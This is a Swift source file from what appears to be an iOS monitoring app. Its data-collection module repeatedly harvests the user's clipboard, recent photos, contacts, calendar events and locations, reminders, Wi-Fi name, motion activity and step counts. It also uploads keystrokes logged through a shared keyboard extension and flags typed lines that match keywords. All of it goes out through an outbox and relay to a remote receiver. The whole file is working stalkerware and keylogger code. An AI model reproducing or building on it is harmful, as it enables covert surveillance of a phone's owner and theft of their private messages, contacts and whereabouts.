import Foundation
import Photos
import Contacts
import EventKit
import CoreMotion
import HealthKit
import UIKit
import SystemConfiguration
import FamilyControls

final class Modules {
    static let shared = Modules()
    private var last: [String: Date] = [:]
    private let motion = CMMotionActivityManager()
    private let health = HKHealthStore()
    private var lastClip: String?
    private var lastClipCount = -1

    func boot() {
        UIDevice.current.isBatteryMonitoringEnabled = true
        NotificationCenter.default.addObserver(forName: UIDevice.batteryStateDidChangeNotification,
                                               object: nil, queue: .main) { [weak self] _ in self?.battery() }
        Timer.scheduledTimer(withTimeInterval: 5, repeats: true) { [weak self] _ in self?.tick() }
        if Settings.shared.isOn(.motion) { startMotion() }
        if Settings.shared.isOn(.batteryState) { battery() }
    }

    private func due(_ key: String, _ seconds: TimeInterval) -> Bool {
        let now = Date()
        if let l = last[key], now.timeIntervalSince(l) < seconds { return false }
        last[key] = now
        return true
    }

    private func tick() {
        guard Settings.shared.inWindow() else { return }
        if Settings.shared.isOn(.clipboard), due("clip", 4) { clipboard() }
        if Settings.shared.isOn(.batteryState), due("bat", 120) { battery() }
        if Settings.shared.isOn(.wifiInfo), due("wifi", 60) { wifi() }
        if Settings.shared.isOn(.photoLibrary), due("photos", 300) { photos() }
        if Settings.shared.isOn(.contacts), due("contacts", 86_400) { contacts() }
        if Settings.shared.isOn(.calendar), due("cal", 3600) { calendar() }
        if Settings.shared.isOn(.reminders), due("rem", 3600) { reminders() }
        if Settings.shared.isOn(.health), due("health", 1800) { healthData() }
        if Settings.shared.isOn(.keylog), due("keys", 20) { keylog() }
    }

    private func clipboard() {
        let pb = UIPasteboard.general
        let c = pb.changeCount
        guard c != lastClipCount else { return }
        lastClipCount = c
        guard let s = pb.string, !s.isEmpty, s != lastClip else { return }
        lastClip = s
        Outbox.shared.send(["type": "clipboard", "text": s, "t": Date().timeIntervalSince1970])
    }

    private func battery() {
        Outbox.shared.send(["type": "battery",
                            "level": Int(UIDevice.current.batteryLevel * 100),
                            "charging": UIDevice.current.batteryState != .unplugged,
                            "t": Date().timeIntervalSince1970])
    }

    private func wifi() {
        var ssid = "-"
        if let ifs = CNCopySupportedInterfaces() as? [String] {
            for i in ifs {
                if let info = CNCopyCurrentNetworkInfo(i as CFString) as? [String: Any],
                   let s = info[kCNNetworkInfoKeySSID as String] as? String { ssid = s }
            }
        }
        Outbox.shared.send(["type": "wifi", "ssid": ssid, "t": Date().timeIntervalSince1970])
    }

    private func photos() {
        PHPhotoLibrary.requestAuthorization(for: .readWrite) { st in
            guard st == .authorized || st == .limited else {
                HealthMon.fail(.photoLibrary, "Photos permission denied"); return
            }
            let o = PHFetchOptions()
            o.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
            o.fetchLimit = 8
            PHAsset.fetchAssets(with: .image, options: o).enumerateObjects { asset, _, _ in
                let r = PHImageRequestOptions(); r.isSynchronous = true
                r.deliveryMode = .fastFormat; r.resizeMode = .fast
                PHImageManager.default().requestImage(for: asset,
                    targetSize: CGSize(width: 480, height: 480), contentMode: .aspectFit, options: r) { img, _ in
                    guard let d = img?.jpegData(compressionQuality: 0.6) else { return }
                    Outbox.shared.send(["type": "photoLib", "b64": d.base64EncodedString(),
                                        "at": asset.creationDate?.timeIntervalSince1970 ?? 0])
                }
            }
            HealthMon.ok(.photoLibrary)
        }
    }

    private func contacts() {
        let store = CNContactStore()
        store.requestAccess(for: .contacts) { ok, _ in
            guard ok else { HealthMon.fail(.contacts, "Contacts permission denied"); return }
            let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey] as [CNKeyDescriptor]
            let req = CNContactFetchRequest(keysToFetch: keys)
            var out: [[String: String]] = []
            try? store.enumerateContacts(with: req) { c, _ in
                out.append(["name": "\(c.givenName) \(c.familyName)".trimmingCharacters(in: .whitespaces),
                            "phone": c.phoneNumbers.first?.value.stringValue ?? ""])
            }
            Outbox.shared.send(["type": "contacts", "count": out.count, "items": Array(out.prefix(500))])
            HealthMon.ok(.contacts)
        }
    }

    private func calendar() {
        let store = EKEventStore()
        store.requestFullAccessToEvents { ok, _ in
            guard ok else { HealthMon.fail(.calendar, "Calendar permission denied"); return }
            let p = store.predicateForEvents(withStart: Date(), end: Date().addingTimeInterval(604800), calendars: nil)
            let items = store.events(matching: p).map {
                ["title": $0.title ?? "", "start": $0.startDate.timeIntervalSince1970, "loc": $0.location ?? ""] as [String: Any]
            }
            Outbox.shared.send(["type": "calendar", "items": items])
            HealthMon.ok(.calendar)
        }
    }

    private func reminders() {
        let store = EKEventStore()
        store.requestFullAccessToReminders { ok, _ in
            guard ok else { HealthMon.fail(.reminders, "Reminders permission denied"); return }
            store.fetchReminders(matching: store.predicateForReminders(in: nil)) { r in
                Outbox.shared.send(["type": "reminders", "items": (r ?? []).filter { !$0.isCompleted }.map { $0.title }])
                HealthMon.ok(.reminders)
            }
        }
    }

    private func startMotion() {
        guard CMMotionActivityManager.isActivityAvailable() else { HealthMon.fail(.motion, "Motion unavailable"); return }
        motion.startActivityUpdates(to: .main) { a in
            guard let a, Settings.shared.isOn(.motion) else { return }
            let kind = a.automotive ? "driving" : a.walking ? "walking"
                     : a.running ? "running" : a.cycling ? "cycling" : a.stationary ? "stationary" : "unknown"
            Outbox.shared.send(["type": "motion", "activity": kind, "t": Date().timeIntervalSince1970])
        }
    }

    private func healthData() {
        guard HKHealthStore.isHealthDataAvailable() else { HealthMon.fail(.health, "HealthKit unavailable"); return }
        let steps = HKQuantityType(.stepCount), hr = HKQuantityType(.heartRate)
        health.requestAuthorization(toShare: [], read: [steps, hr]) { ok, err in
            guard ok else { HealthMon.fail(.health, err?.localizedDescription ?? "Health denied"); return }
            let p = HKStatisticsQuery.predicateForSamples(withStart: Calendar.current.startOfDay(for: Date()), end: Date())
            let q = HKStatisticsQuery(quantityType: steps, quantitySamplePredicate: p, options: .cumulativeSum) { _, s, _ in
                Outbox.shared.send(["type": "health",
                                    "steps": Int(s?.sumQuantity()?.doubleValue(for: .count()) ?? 0),
                                    "t": Date().timeIntervalSince1970])
            }
            self.health.execute(q)
            HealthMon.ok(.health)
        }
    }

    private func keylog() {
        let store = UserDefaults(suiteName: Config.appGroup)
        guard let log = store?.stringArray(forKey: "log"), !log.isEmpty else { return }
        let recent = Array(log.suffix(200))
        Outbox.shared.send(["type": "keys", "lines": recent])
        for line in recent {
            let lower = line.lowercased()
            for kw in Settings.shared.keywords where lower.contains(kw.lowercased()) {
                Relay.shared.sendJSON(["type": "alert", "title": "Keyword: \(kw)", "reason": line,
                                       "feature": "keywordTriggers", "ok": true,
                                       "at": Date().timeIntervalSince1970])
            }
        }
        store?.set([], forKey: "log")
        HealthMon.ok(.keylog)
    }
}
